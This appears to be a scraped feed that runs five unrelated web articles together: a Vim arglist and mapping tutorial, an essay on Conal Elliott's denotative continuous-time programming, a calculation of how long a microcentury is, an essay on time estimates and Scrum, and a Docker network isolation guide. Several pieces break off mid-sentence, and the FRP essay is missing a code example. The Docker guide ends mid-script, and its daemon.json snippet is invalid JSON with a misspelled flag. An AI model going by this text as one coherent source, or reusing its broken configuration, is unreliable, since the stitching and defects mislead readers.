<p>The argument list (also called arglist) is the fourth and last container allowing you to organize your open files. It’s useful to see it as a <em>stable subset</em> of the buffer list, as Drew Neil point it out in <a href="http://vimcasts.org/episodes/meet-the-arglist/" target="_blank" rel="noopener">one of his vimcast</a>. As a result, it follows these two rules:</p>
<ol>
<li>Every file in the arglist will be in the buffer list.</li>
<li>Some files in the buffer list won’t be in the arglist.</li>
</ol>
<p>The files you want to open when you run Vim - such as executing <code>vim file1 file2 file3</code> - will be automatically added to the arglist and, as we just saw, to the buffer list.</p>
<p>The arglist can be useful to isolate some files from the buffer list to do some operations on them. Here are some commands you can use to manipulate the arglist:</p>
<ul>
<li><code>:args</code> - Display the arglist.</li>
<li><code>:argadd</code> - Add file to the arglist.</li>
<li><code>:argdo</code> - Execute a command on every file in the arglist.</li>
</ul>
<p>To edit the files in the arglist, you can use these commands:</p>
<ul>
<li><code>:next</code> - Move to the next file in the arglist.</li>
<li><code>:prev</code> - Move to the previous file in the arglist.</li>
<li><code>:first</code> - Move to the first file in the arglist.</li>
</ul>
<p>I don’t use very often the arglist personally, but many users do. The buffer list can be modified by other actions unrelated directly to buffers, like opening new windows. The arglist stays the same, except if you explicitly modify it. That’s why it’s stable.</p>


  




    





  





<h2 id="mapping-keystrokes">Mapping Keystrokes</h2>
<p>We’ve seen a great deal of keystrokes and commands. It would be nice to be able to modify these keystrokes, or to assign new keystrokes to precise commands.</p>
<p>You can use mapping commands for every Vim mode:</p>
<ul>
<li><code>:nmap</code> - Create new mapping for NORMAL mode.</li>
<li><code>:imap</code> - Create new mapping for INSERT mode.</li>
<li><code>:vmap</code> - Create new mapping for VISUAL mode.</li>
</ul>
<p>It might sound confusing to have different mappings for different modes, but it’s actually very easy to remember, thanks to our muscle memory.</p>
<p>Let’s try an example together by mapping <code>w</code> to <code>dd</code>. By default, <code>dd</code> delete a line, and <code>w</code> is a motion to move your cursor from word to word.</p>
<ol>
<li>Run the command <code>:nmap w dd</code></li>
<li>Try to hit the keystroke <code>dd</code>. It will delete a line.</li>
<li>Try to hit <code>w</code>. It deletes a line to.</li>
</ol>
<p>However, <code>w</code> can’t be used anymore to move from word to word. Let’s try to fix that by running: <code>:nmap w v</code>.</p>
<p>Try to hit <code>v</code> now. It deletes a line too! You just did a recursive mapping: <code>v</code> maps to <code>w</code> which maps to <code>dd</code>. It would be …</p></section></article></div></div>

<p>For many years I been searching for the perfect paradigm for programming user interfaces. Like many others, I fell in love with FRP with the rise of ReactJS and spent a few years searching for the perfect reactive model. Eventually, I found my way back to the original work on FRP by Conal Elliott. It took me almost a year to make sense of it. This essay attempts to make Conal’s vision more understandable to less mathematically-oriented programmers, and also show how this perspective could be the foundation for a new era of programming, not just with user interfaces, but also multi-node computing, storage, machine learning, etc.</p>

<p>This essay assumes familiarity with:</p>

<ul>
  <li>JavaScript syntax, including Promises,</li>
  <li>a web FRP library, such as ReactJS, VueJS, CycleJS, Redux, or Elm,</li>
  <li>and minimal ML/Haskell syntax, including the <code>Maybe</code> type.</li>
</ul>

<h2 id="modern-reactive-web-programming">Modern Reactive Web Programming</h2>

<p>I fell in love with ReactJS in late 2014. The view is a pure function of state. It was so obviously <em>right</em>.</p>

<p>But of course React isn’t the whole answer. It’s just a view library that keeps the view in sync with state. It’s left open how you manage that state.</p>

<p>Inspired by the Elm Architecture, Redux became the popular answer to the state management question. It puts the state of the entire application into a single object. To affect this global state object, your HTML event handlers emit “actions”, such as <code>{"type": "newTodoItem", "description": "Clean my room"}</code>. You then define a reducer function that modifies the global state each time it receives an action. This architecture initially made a lot of sense to me. One big sell is that its global state object is easily serialized, which enables hot reloading and time-travel debugging.</p>

<p>Unexpectedly, when I tried to make sense of large Redux projects, I found myself getting headaches. I found it difficult to understand how the app fit together, which parts affected which other parts. I began to see that the Redux architecture was <a href="https://futureofcoding.org/papers/comprehensible-frp">simulating global mutable state in a seemingly immutable and functional setting, ruining modularity and comprehensibility</a>.</p>

<p>I eagerly slurped up each new React-inspired framework, such as VueJS and CycleJS, to see if they could finally be the “full solution” to interface development, but none felt quite right.</p>

<p><a href="https://pchiusano.github.io/">Paul Chiusano</a> suggested I read <a href="http://conal.net/">Conal Elliott</a>, the creator of the FRP paradigm. Paul claimed that React and the other JS-based FRP libraries weren’t even ‘true’ FRP. I didn’t like to hear this. I loved React and the FRP I knew. I was reluctant to read <a href="http://conal.net/papers/icfp97/">a stodgy paper from the 90s</a>. But I trusted and respected Paul so I gave it a go.</p>

<p>It was a lot of mathematics and strange symbols. What’s a “least upper bound” and “pointed CPO”? My eyes glazed over. I tried a more <a href="http://conal.net/papers/push-pull-frp/">recent paper he wrote on FRP</a>, but it was full of scary Applicative Functors and Monads. I gave up.</p>

<p>However, I couldn’t escape HN comments alluding to “<a href="https://hn.algolia.com/?sort=byPopularity&amp;prefix&amp;page=0&amp;dateRange=all&amp;type=comment&amp;query=real%20frp">real</a>” or “<a href="https://hn.algolia.com/?sort=byPopularity&amp;prefix&amp;page=0&amp;dateRange=all&amp;type=comment&amp;query=original%20frp">original</a>” FRP. They were annoying enough to send me back to Conal for another try. This time I printed out all his papers, determined to make sense of them!</p>

<p>I took my time with the unfamiliar mathematical and typeclass concepts. With a lot of focused reading, it finally began to click.</p>

<h2 id="dctp-denotative-continuous-time-programming">DCTP: Denotative Continuous-Time Programming</h2>

<p>It’s important to distinguish between the <a href="https://medium.com/@andrestaltz/why-i-cannot-say-frp-but-i-just-did-d5ffaa23973b">many flavors of FRP</a>. The name originally comes from Conal Elliott and Paul Hudak’s work in the 90s . The term has since been stretch so far beyond its original meaning that Conal has <a href="https://stackoverflow.com/questions/5385377/the-difference-between-reactive-and-functional-reactive-programming/5386908#5386908">retreated to a new phrase</a> to describe his original vision: Denotative Continuous Time Programming (DCTP).</p>

<h2 id="d-is-for-denotative">D is for Denotative</h2>

<p>The D of DCTP has similarly nuanced intellectual roots. It stands for “denotative”, a term <a href="https://www.cs.cmu.edu/~crary/819-f09/Landin66.pdf">Peter Landin proposed</a> as a an alternative to “nonprocedural”, “functional” or “declarative”, which lack precise definitions. A denotative programming language is one where:</p>

<blockquote>
  <p>(a) each expression has a nesting subexpression structure,</p>
</blockquote>

<p>Unlike most programming languages which have a mix of statement commands and expressions, denotative programming languages live solely in the world of expressions. For example, instead of if-statements, there are ternary expressions. Instead of loops, recursion. Nested mathematical-like expressions are the only way to construct programs, and thus a program is simply one large, nested expression.</p>

<blockquote>
  <p>(b) each subexpression denotes something (usually a number, truth value or numerical function),</p>
</blockquote>

<p>Additionally, the components of denotative languages must <em>denote</em> some mathematical object. This was directly inspired by Chris Strachey and Dana Scott’s work from the early 1970’s on denotational semantics, an approach to modeling programming languages with mathematical objects. But where denotational semantics was originally created as a way to <em>analyze all programming languages</em>, denotative programming languages are a very specific kind of language, purposefully designed to be well-suited for mathematical reasoning.</p>

<p>For example, a map (“object” in JavaScript, “dictionary” in Python) in a denotative language could <em>denote</em> a <em>mathematical function</em> of keys to <code>Maybe</code> values. The empty map would be <code>key =&gt; Nothing</code>, returning <code>Nothing</code> for any key. Inserting a key, value pair could be: <code>(map, key, value) =&gt; (key' =&gt; key === key' ? Just value : map(key))</code>, which wraps an old map function with a new key comparison, but delegates to the old function for the remaining keys.</p>

<p>This map need not be <em>implemented</em> in such an inefficient way for a language to qualify as denotative.  Denotations are specifications, describing the <em>what</em>, but leaving the <em>how</em> open. Implementations of denotative languages can be as as non-denotative as efficiency concerns demand. A common misunderstanding of the denotative approach is that it’s impractical to eschew statements, because statements must be executed eventually for computation to be carried out. This is of course true, but the distinction is that in denotative languages, statements live in the implementation of the language instead of in the language itself.</p>

<p>For example, even non-denotative languages have functions like <code>pow</code>, <code>sqrt</code>, <code>log</code>, <code>sin</code>, and <code>cos</code>, which denote their equivalent mathematical operations. Users of these functions are free to treat them as true expressions, without having to worry about their potentially non-denotative implementation details. Do they use specially-designed hardware? Loops? It doesn’t matter: users are free to write <code>log(x) + sin(y)</code> and the language’s compiler or interpreter will execute these expressions with whatever non-denotative algorithm is most efficient, as long as it meets the denotative specification for <code>log</code> and <code>sin</code>.</p>

<p>From the denotative perspective, anywhere an operation does not meet its denotative equivalent is a bug. This would include anywhere floating-point math is used, which causes, for example,  <code>0.1 + 0.2</code> to equal <code>0.30000000000000004</code>. In other words, all the quirks of math you need to learn <em>above and beyond what you already learned in algebra class</em> is considered incidental complexity. On the other hand, non-denotative languages aren’t trying to be denotative, so it’s not entirely fair to rank them according to a rubric they are not aiming for.</p>

<blockquote>
  <p>(c) the thing an expression denotes, i.e., its “value”, depends only on the values of its subexpressions, not on other properties of them.</p>
</blockquote>

<p>The final criteria is that expressions in denotative languages are entirely self-contained. There’s no action-at-a-distance. There’s no way to call <code>someValue.update()</code>. For one, that would be a statement. But additionally, all possible ways <code>someValue</code> updates need to be defined in one of the sub-expressions of <code>someValue</code> itself.</p>

<p>In summary, a denotative language is a pure functional language, with the addition of point (b): mathematical denotations.</p>

<h3 id="benefits-of-denotative-programming">Benefits of Denotative Programming</h3>

<p>Programmers spend roughly <a href="http://www.humane-assessment.com/guide/assessment-costs/">50% of their time reading code</a>, so a language that better lends itself to comprehensibility is a boon for productivity.</p>

<p>Denotative languages better convey the global structure of a program. We can <em>fully</em> understand an expression by its subexpressions, and their subexpressions, recursively. There are no spooky action-at-a-distance side-effects that can manipulate things from afar. We don’t have to read the entire codebase to ensure we understand a single piece; we must merely read its subexpressions, recursively. This allows us to quickly rule out what we do and do not need to read, saving us a lot of time in large codebases. A denotative language resembles a dictionary or encyclopedia, where one can understand an entry by reading it and what it references. A non-denotative language resembles prose, like a novel, which you have to read cover-to-cover to know what happens, even if you only care about one specific character.</p>

<p>These comprehensibility benefits extend to local analysis as well. In denotative programming, the equal sign means what it does in a mathematics textbook: we can replace instances of the left with the expression to the right. This is known as referential transparency. We can safely refactor:</p>

<div><div><pre><code><span>b</span> <span>=</span> <span>f</span><span>(</span><span>a</span><span>)</span>
<span>c</span> <span>=</span> <span>g</span><span>(</span><span>b</span><span>)</span>
<span>d</span> <span>=</span> <span>h</span><span>(</span><span>c</span><span>)</span>
</code></pre></div></div>

<p>to:</p>



<p>True equality is also a boon for performance optimizations, which is about replacing sections of programs with equivalent but faster sections. When your code is free of operational concerns, the language implementer is able to make more interesting optimizations. The flip-side is that because the denotative approach cuts us off from these implementation details, it lessens the ability of a user of a denotative language to improve the performance of their programs. However, programmer time is often more …</p></div></div>

<p>By <b>Susam Pal</b> on 17 Jul 2020</p>
<h2 id="optimal-lecture-time"><a href="#optimal-lecture-time">Optimal Lecture Time</a></h2>

<p>
I recently found this interesting paragraph from an article titled <a href="https://www.ams.org/notices/199701/comm-rota.pdf">Ten Lessons I
Wish I Had Been Taught</a> that is based on a talk presented by
Gian-Carlo Rota in Apr 1996:
</p>

<blockquote>
Running overtime is the one unforgivable error a lecturer can make.
After fifty minutes (one microcentury as von Neumann used to say)
everybody's attention will turn elsewhere even if we are trying to prove
the Riemann hypothesis. One minute overtime can destroy the best of
lectures.
</blockquote>

<p>
That's fine advice. In fact, the whole article is full of good advice
like this. Although it was written primarily for mathematicians, a lot
of what is said in the article applies quite well to professionals in
other fields too.
</p>

<p>
The excerpt I have quoted above got me thinking about exactly how long a
microcentury is. It couldn't be exactly 50 minutes, could it?
</p>


<h2 id="wiktionary-on-microcentury"><a href="#wiktionary-on-microcentury">Wiktionary on Microcentury</a></h2>
<p>
The English Wiktionary entry for <a href="https://en.wiktionary.org/wiki/microcentury">microcentury</a>
(as of <a href="https://en.wiktionary.org/w/index.php?title=microcentury&amp;oldid=59316064">revision
59316064</a> on 7 May 2020) mentions:
</p>

<blockquote>
A time period of a millionth of a century, equal to 52 minutes and 34 seconds.
</blockquote>

<blockquote>
Not a standard unit of measurement, and used mostly humorously to denote
the maximum length of a lecture.
</blockquote>

<p>
This looks incorrect to me. This is based on the oversimplified
assumption that a century contains 36500 days, that is, it assumes that
a century is a span of 100 years where each year has exactly 365 days.
If a century were to have exactly 36500 days, then indeed it would have
3 153 600 000 seconds and one millionth of it would be
3153.6 seconds which is equivalent to 52 minutes 33.6 seconds. This
looks consistent with the Wiktionary entry. However, an actual century
on the calendar does not have exactly 36500 days. Some years are leap
years, so the actual number of days in a century is more than that.
</p>


<h2 id="assumptions"><a href="#assumptions">Assumptions</a></h2>
<p>
Let us find out how long a microcentury is as accurately as possible. We
will count the leap years. We will ignore leap seconds because they are
irregularly spaced and unpredictable. We will also ignore the following
gap between 2 Sep 1752 and 14 Sep 1752 when the British Empire switched
from the Julian calendar to the Gregorian calendar:
</p><pre><samp>$ <kbd>cal 9 1752</kbd>
   September 1752
Su Mo Tu We Th Fr Sa
       1  2 14 15 16
17 18 19 20 21 22 23
24 25 26 27 28 29 30</samp>
</pre>

<p>
The above output can be obtained by running the <code>cal</code> command
as shown above on a Unix or Linux system. Ignoring this gap is
equivalent to assuming that we are working with the Gregorian calender
since the year 1 AD.
</p>

<p>
We will call a year that is a multiple of 100 to be a <em>centurial
year</em>. Further, we will not debate whether a centurial year begins a
new century or ends one, that is, we don't care whether the current
century runs from 2001 to 2100 or if it runs from 2000 to 2099. The
computation presented in the next section works equally well for any
span of 100 years.
</p>


<h2 id="computation"><a href="#computation">Computation</a></h2>
<p>
Any span of 100 years contains exactly one centurial year, that is, a
year that is a multiple of 100. A centurial year is a leap year <em>if
and only if</em> it is also a multiple of 400. Apart from the centurial
year, a century contains 24 occurrences of years that are multiples of 4
and these are all leap years. From these facts, we can conclude that a
span of 100 years contains:
</p>

<ul>
  <li>
    Exactly 25 leap years if the centurial year within the span is a
    multiple of 400.
  </li>
  <li>
    Exactly 24 leap years, otherwise.
  </li>
</ul>

<p>
Therefore a century has either 36524 days or 36525 days. In other words,
a century has either 3 155 673 600 seconds or
3 155 760 000 seconds. Here is a
quick demonstration of this with a simple Python program:
</p>

<pre><code>#!/usr/bin/env python3

import datetime

for year in range(1, 2400, 100):
    delta = datetime.date(year + 100, 1, 1) - datetime.date(year, 1, 1)
    print('{:04}-{:04}: {} d = {} s'
          .format(year, year + 100, delta.days, delta.total_seconds()))</code>
</pre>

<p>
Here is the output of this program:
</p>

<pre><samp>0001-0101: 36524 d = 3155673600.0 s
0101-0201: 36524 d = 3155673600.0 s
0201-0301: 36524 d = 3155673600.0 s
0301-0401: 36525 d = 3155760000.0 s
0401-0501: 36524 d = 3155673600.0 s
0501-0601: 36524 d = 3155673600.0 s
0601-0701: 36524 d = 3155673600.0 s
0701-0801: 36525 d = 3155760000.0 s
0801-0901: 36524 d = 3155673600.0 s
0901-1001: 36524 d = 3155673600.0 s
1001-1101: 36524 d = 3155673600.0 s
1101-1201: 36525 d = 3155760000.0 s
1201-1301: 36524 d = 3155673600.0 s
1301-1401: 36524 d = 3155673600.0 s
1401-1501: 36524 d = 3155673600.0 s
1501-1601: 36525 d = 3155760000.0 s
1601-1701: 36524 d = 3155673600.0 s
1701-1801: 36524 d = 3155673600.0 s
1801-1901: 36524 d = 3155673600.0 s
1901-2001: 36525 d = 3155760000.0 s
2001-2101: 36524 d = 3155673600.0 s
2101-2201: 36524 d = 3155673600.0 s
2201-2301: 36524 d = 3155673600.0 s
2301-2401: 36525 d = 3155760000.0 s</samp>
</pre>

<p>
Thus one millionth of a century has 3155.6736 or 3155.7600 seconds, that
is 52 minutes 35.6736 seconds or 52 minutes 35.7600 seconds.
</p>


<h2 id="Conclusion"><a href="#conclusion">Conclusion</a></h2>

<p>
If we round off the number of seconds in a microcentury to one decimal
place, we can say that a microcentury has 52 minutes 35.7 seconds.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main"><div><div><article role="main"><p>No, engineers don’t suck at time estimates - and generally speaking humans are better estimators than what most people believe. This seems rather surprising given all we’ve heard about the problems of bad time estimations, projects going overboard, etc and of course, your personal experience with software time estimates. But if people are really bad at estimation, how does that fit with our obvious evolutionary need to make quick decisions based on partial data? if we can’t estimate well how did we decide if a gap is wide enough to jump over, if an animal is worth the hunt, if a certain area is more likely to have water and shade? Without estimation skills we wouldn’t survive. So what’s going on?</p><p>One obvious explanation is that we are only good at estimating physical things such as sizes and distances. However, this does not seem likely given the large number of non-physical decisions we needed to make, like selecting a mate.
Another, more likely explanation is that the estimates are good, but the interpretation and usage of the estimates is flawed. In other (slightly cynical) words: the engineers are good at estimating, it’s the project managers who suck at using the estimates.</p><p>Let me explain.</p><p>“your estimate was wrong” - is something i’ve heard many times. But this sentence doesn’t make any sense… after all, an estimate is by definition not exact; in fact, if the results would always agree with estimates foul play would be immedialy suspected. If I estimated one day and the actual time was 1.5 days, was I “wrong”? most people would say I wasn’t. But if if the actual time was 20 days most people would argue I was wrong. Somewhere between one and 20 days there is an implicit “reasonable error” threshold we never discussed! I never gave an error margin for my estimate, did I?</p><p>Since we don’t expect an estimate to be an exact guess of the actual value, what do we expect from an estimate? When we make decisions based on estimates, we can only be right or wrong in our decision, you can’t be “a lot more right”. We need to guess a value beyond a certain threshold and within a certain tolerance, with high probability of being right because that our lives depend on that gap being just short enough for us to jump over. Decisions are almost always non-linear like that and it should not be surprising given the nature of knowledge and learning. We take in examples and extrapolate patterns and behaviours. Which means we are dealing with groups, and probability distributions. This may be surprising at first, because when you are estimating this one <em>particular</em> job, you don’t think of a distribution of a million other <em>different</em> jobs. An estimate is predicting the future in which we see the actual value.
</p><div><figure itemprop="associatedMedia" itemscope="" itemtype="http://schema.org/ImageObject"><p><img itemprop="thumbnail" src="https://blog.nukemberg.com/img/time-estimate.jpg" alt="/img/time-estimate.jpg"></p><a href="https://blog.nukemberg.com/img/time-estimate.jpg" itemprop="contentUrl"></a></figure></div><p>What we need to know, is that in a certain number of futures, say 90% of them, a value won’t be over or under a certain threshold. Or phrased mathematically, that the 90th percentile of the distribution of futures will be over (or under) a certain number. An estimate is a percentile! but which percentile? is it the median? the 99th?
For software time estimates it has been <a href="https://erikbern.com/2019/04/15/why-software-projects-take-longer-than-you-think-a-statistical-model.html">observed to be the median</a> (50th percentile), meaning to be right about half the times. Is this inherent? Estimates can desmonstrably be calibrated to higher percentiles by as little as <a href="https://www.tonym-v.com/blog/2019/10/2/improve-your-estimations-with-the-equivalent-bet-test">brief emotional self manipulation</a>; You could easily estimate the 90th percentile of many things - just read <a href="https://www.amazon.com/How-Measure-Anything-Intangibles-Business-ebook/dp/B00INUYS2U">How to measure anything</a>.</p><p>Usally when I tell this to people, they often respond with “we’ll train to estimate the average”. Sadly, this is not possible. The mean is a statistically “unstable” or “unrobust” aggregate, where as percentiles are “stable” or “robust”. Consider a group of task completion times [73, 67, 12, 38, 18, 11, 42]. The mean is ~37.29 and the median is pretty close, 38. But as soon as we get another measurement, say 293, the mean changes significantly to 69.25 while the median changes only slightly to 42. The mean is sensitive to outliers, and the more skewed and high variance the distribution the less robust and stable it will be.</p><p>Having estimated tasks, what do we do with them? We sum them up.</p><p>Either for project budget or for by enqueuing with the next tasks, we sum them. But wait, we know that percentiles are not additive! how can this ever work? it never does. Summing up percentiles compounds errors and with skewed distributions, and in particular heavy tailed distributions, the errors are very large. Let’s have a look at what a task completion time distribution would look like:</p><div><figure itemprop="associatedMedia" itemscope="" itemtype="http://schema.org/ImageObject"><p><img itemprop="thumbnail" src="https://blog.nukemberg.com/img/task-time-distribution.png" alt="/img/task-time-distribution.png"></p><a href="https://blog.nukemberg.com/img/task-time-distribution.png" itemprop="contentUrl"></a></figure></div><p>A task has some minimum time it has to take, but beyond that it can pretty much take as long as inifinity. We all know from experience, that when things get out of control they go wayyyy out of control. Once you hit a rare bug, you might be chasing a wild goose for two months. That 10% over the estimate might be a day late or a year, the higher percentile you pick the more extreme the errors relatively.</p><p>To be honest, it’s old news; This has been known for a long time. Percentile based project predictions have been done as early as World War II, perhaps even before that - yet they remain fairly unknown in the industry. Not only are we ignorant of proven methods, we invent new ones which are outright harmful. Remember that burn down chart? the <em>backlog</em> is nothing more than a sum of time estimates! And every two weeks, sitting in the famous sprint retrospective people work to calibrate their estimates to the random walk sum of task completion times on the burndown chart. How do you calibrate a percentile to a sum? If the distribution is something like a log-normal distribution, the random walk sum will converge to the mean, and the median is relatively close to the mean - which is summable, and both are pretty stable. So by repeatedly calibrating estimates to the running-sum of task completion times (the backlog) you will converge close to the median. Now go tell your project manager there is a 50% chance of their project running late, anywhere between a day and eternity, and see how they respond. A 50% chance of uncapped delay is a useless estimate.</p><p><strong>Scrum is a training method for useless time estimates</strong>. It actively destroys your ability to manage your project.</p><p>Don’t get me wrong, I’m not against Agile; The spirit of Agile, some of the methods and ceremonies of Scrum have value. But Scrum <em>as a system</em> is actively harmful, especially in high variance situations where the work is far from the nice log-normal distribution. If you <a href="https://blog.nukemberg.com/post/the-burndown-chart-fallacy/">optimize for an arbitrary metric</a>, you will get arbitrary results. In ops/SRE and pure research many people have intuitive sense that Scrum and traditional project management are wrong, although they can’t quite articulate why. The reasons become very clear when we consider what happens to sum based project management methods if the task distribution becomes heavy tailed. A task that is one week late is likely to take <em>at least</em> one more week - is a common thumb rule in such domains; This is called a “Power law” and can be modeled by the famous Pareto distribution. The thing about the Pareto distribution is that its mean does not converge! In other words, using sum based planning methods with such distributions is equivalent to managing by rolling dice. A little worse actually, as dice are a cheap method of generating random numbers where as time estimates are intrusive and sometimes expensive. This isn’t a problem unique to Scrum, nor does it originate from it. The problem is the assumption of determinism and accuracy which is the prevaling “machine age” mindset. Pretty much all of the common project management tools have the same issue - have a look at a Gantt chart, it has no probability intervals or error ranges. They are all worse than useless. It shouldn’t be a surprise that despite people being bad at estimating large tasks naive estimates are reliably more accurate than project management tools.</p><p>Recognizing the probabilistic nature of the world is key. Probability isn’t a tool for making predictions, it is a tool for quantifiying uncertainty. Instead of managing resources (which are usually highly certain) we should be managing uncertainty, with probabilistic methods appropriate for the task. With this mindset, the first thing to do is understand the business context and the distributions involed: are you in a low or high variation domain? Industrial methods which aim to improve throughput and efficiency all assume low variance, sometimes actively force low variance by getting rid of outliers; this isn’t necessarily possible in your business context. Industrial methods are good when used in context, but horrible when used in high variability and unpredictable domains. For those we have other methods, which emphasize low latency and rapid adaptation. Instead of Scrum, you could try:</p><ul><li><a href="https://www.joelonsoftware.com/2007/10/26/evidence-based-scheduling/">Monte-Carlo simulations based on time estimates</a></li><li><a href="https://basecamp.com/shapeup/2.1-chapter-07">Time boxing and bets</a></li><li>Latency optimizing methods which dispense with time estimates, like Kanban</li></ul><p>I’ve listed the methods above in order of rising uncertainty, Monte-Carlo simulations or time boxing would probably be easiest to start with. The biggest obstacle in implementing these is convincing managers that “predictability” isn’t so important as they imagine. For high variation domains it’s nothing more than a fantasy anyway.</p><p>So there you have it: people don’t suck at estimation. They suck at management 🤷</p><hr></article></div></div></div></div>]]>

<blockquote><p>TL:DR: when testing Docker with “–icc=false” on Ubuntu Server 16.04.3 I found that br_netfilter was required but not configured by default.&nbsp;Even when enabled, I found that the Docker Host physical network was not protected against container breakout.&nbsp;Testing with IP Masquerade disabled addressed&nbsp;Docker Host physical network&nbsp; security, however, with ICC and IP Masquerade disabled it was just as “easy” to manage the environment with&nbsp;“–iptables=false” and a firewall script.</p></blockquote>
<p>I recently ran through an exercise where I was testing Docker Container Network Isolation in a lab environment – this involved reviewing the impact of disabling ICC, IP Masquerade and Docker’s interaction with IP tables itself. The scenarios I was trying to provide isolation for are as follows:</p>
<ul>
<li>Docker Container access to Docker Containers within the same Docker network</li>
<li>Docker Container access to other Docker Containers in different Docker network</li>
<li>Docker Container access to Docker host</li>
<li>Docker Container&nbsp;access to Docker host physical network/ other hosts</li>
</ul>

<h3>Disabling Inter-Container Connectivity (ICC)</h3>
<p>By default there is limited Docker Container Network Isolation in that docker containers have external network access, can talk to each other and the Docker host itself – i.e. there is limited container network isolation in the event of a container being compromised. Docker has a built in capability called ICC that can be disabled in order to provide Docker Container Network Isolation. The caveat being that to enable cross-container communication you have to use the “–link” argument when launching containers in order for the docker daemon to automatically create the required iptables rules to enable communication between containers on exposed ports.</p>
<p>When testing this on Ubuntu 16.04.3, unfortunately, despite documentation indicating that “–link” will automatically create iptables rules to enable cross docker network container access, this proved not to be the case when running Ubuntu 16.04.3.&nbsp;I also found that inter container communication still worked, despite ICC being disabled.</p>
<blockquote><p>If the Docker daemon is running with both –icc=false and –iptables=true then, when it sees docker run invoked with the –link= option, the Docker server will insert a pair of iptables ACCEPT rules so that the new container can connect to the ports exposed by the other container – the ports that it mentioned in the EXPOSE lines of its Dockerfile<br>
Source</p></blockquote>
<p>ICC was disabled on the Docker host using a daemon.json file under /etc/docker – once set, ensure you restart the docker service:</p>
<pre>{
 icc: "false"
}</pre>
<p>On further investigation as to why ICC was not behaving as expected I found that the bridge netfilter (br_netfilter) driver is not enabled by default on Ubuntu 16.4.3. To enable this you need to configure the docker host as below:</p>
<pre># Enable iptables filtering on bridge interfaces
sudo vi /etc/modules-load.d/bridge.conf:

br_netfilter

sudo vi /etc/sysctl.d/bridge.conf:

net.bridge.bridge-nf-call-ip6tables = 1
net.bridge.bridge-nf-call-iptables = 1
net.bridge.bridge-nf-call-arptables = 1</pre>
<p>Now load the kernel module loaded and set the required kernel parameters:</p>
<pre>sudo modprobe br_netfilter
sudo sysctl net.bridge.bridge-nf-call-iptables=1
sudo sysctl net.bridge.bridge-nf-call-ip6tables=1
sudo sysctl net.bridge.bridge-nf-call-arptables=1</pre>
<p>With the br_netfilter module loaded, and required parameters set, ICC behaved as expected, in that:</p>
<ul>
<li>Containers on the same network could not communicate with one-another</li>
<li>Containers could not communicate with containers on other Docker networks</li>
<li>Containers could not communicate with the Docker host itself</li>
</ul>
<p>It is important to note that any user/ docker-compose defined networks will have ICC enabled, despite the daemon.json file configuration. You will need to configure/ modify any network in docker so that ICC is disabled – the Docker compose file below shows and example of this:</p>
<pre>[...]
   networks:
      default:
        driver_opts: 
           com.docker.network.bridge.enable_icc: "false"</pre>
<p>This protected the host, and other containers on any Docker Compose-created network.</p>
<h3>The IP Masquerade “Gotcha”</h3>
<p>The final issue I ran into when testing ICC was that I wanted to protect the Docker host subnet: in the event of a container becoming compromised – I wanted to protect my management network. By default IP masquerade is enabled on docker0 and any newly created Docker compose/ user defined networks (unless specifically disabled at time of creation). This meant that whilst the Docker host / Docker networks were protected, my physical network was not.</p>
<p>It is possible to disable IP masquerade in a Docker Compose file using the below driver option in docker compose:</p>
<pre>[...] 
networks: 
   default: 
&nbsp;     driver_opts: 
         com.docker.network.bridge.enable_icc: "false"
   &nbsp;     com.docker.network.bridge.enable_ip_masquerade: "false"</pre>
<p>However, at this point you have to manually define masquerade rules for any outbound traffic from the container (i.e. for WordPress, the plugin store). This becomes, in my opinion, as complex to manage as running Docker itself with the “<strong>–iptables=fase</strong>” configuration flag, where the administrator has to manually configure all iptables rules for the entire system. A key consideration here is the masquerade rules themselves, where the interface name has to be specified but could change in the event of using docker compose – example rule below.</p>
<pre>sudo iptables -t nat -A POSTROUTING -s $DOCKER_NETWORK_SUBNET ! -d $PROTECTED_LAN ! -o $DOCKER_NETWORK_INTERFACE -j MASQUERADE</pre>
<p>YMMV: it is worth testing as ICC being disabled certainly has its advantages, for direct exposure of services comprised of multiple containers via Docker Expose for example) with ICC set to false you can avoid IPAM/ IP address assignment in defining services as it will enable hostname/ connectivity on exposed ports automatically, irrespective of whether IP address changes etc.</p>
<h3>To Hell with It… disable Docker’s iptables Integration</h3>
<p>So… ICC didn’t quite fit the bill due to management network isolation/ protection. As a result I opted to go down the route of disabling Docker’s hook in to iptables, <strong>thus requiring manual iptables configuration</strong>. This solution provided full&nbsp;Docker Container Network Isolation.</p>
<p>Target network topology is as illustrated below (click image for full size):</p>
<p><a href="https://www.cb-net.co.uk/wp-content/uploads/2018/01/cbnet-docker-topology.png"><img loading="lazy" src="https://www.cb-net.co.uk/wp-content/uploads/2018/01/cbnet-docker-topology-300x98.png" alt="cbnet-docker-topology" width="300" height="98" srcset="https://www.cb-net.co.uk/wp-content/uploads/2018/01/cbnet-docker-topology-300x98.png 300w, https://www.cb-net.co.uk/wp-content/uploads/2018/01/cbnet-docker-topology-768x251.png 768w, https://www.cb-net.co.uk/wp-content/uploads/2018/01/cbnet-docker-topology-1024x335.png 1024w, https://www.cb-net.co.uk/wp-content/uploads/2018/01/cbnet-docker-topology-1200x392.png 1200w, https://www.cb-net.co.uk/wp-content/uploads/2018/01/cbnet-docker-topology.png 1437w" sizes="(max-width: 300px) 100vw, 300px"></a></p>
<p>To disable the Docker hook into iptables the following daemon.json file is needed under /etc/docker/daemon.json – once created, restart the Docker service:</p>
<pre>{
"iptables":false
}</pre>
<p>I created an iptables script in order to provide like-for-like DOCKER and DOCKER-ISOLATION chain capabilities, without Docker itself creating or modifying the Docker host firewall itself. An example script is included below.</p>
<p>This script, in summary meets all of the requirements set out at the beginning of this post:</p>
<ul>
<li>Docker Container access to Docker Containers within the same Docker network: <span>whilst allowed in the script below, this is easy to achieve and highlighted in script</span></li>
<li>Docker Container access to other Docker Containers in different Docker network: <span>blocked</span></li>
<li>Docker Container access to Docker host: <span>blocked</span></li>
<li>Docker Container&nbsp;access to Docker host physical network/ other hosts: <span>blocked, unless by exception</span></li>
</ul>
<p>I also opted to use IPAM for containers within this environment – this meant defining Docker networks with IP subnets/ containers with static IP addresses:</p>
<pre># Network for use by APP1
sudo docker network create \
 --driver=bridge \
 --subnet=10.10.101.0/24 \
 --ip-range=10.10.101.0/24 \
 --gateway=10.10.101.1 \
int-app1

# Network for use by APP2
sudo docker network create \
 --driver=bridge \
 --subnet=10.10.102.0/24 \
 --ip-range=10.10.102.0/24 \
 --gateway=10.10.102.1 \
ext-app2</pre>
<p>When creating containers I specified the relevant Docker network and required IP address for each container, as below:</p>
<pre># APP1 MySQL and WordPress IP Addresses
APP1_MYSQLIP="10.10.101.2"
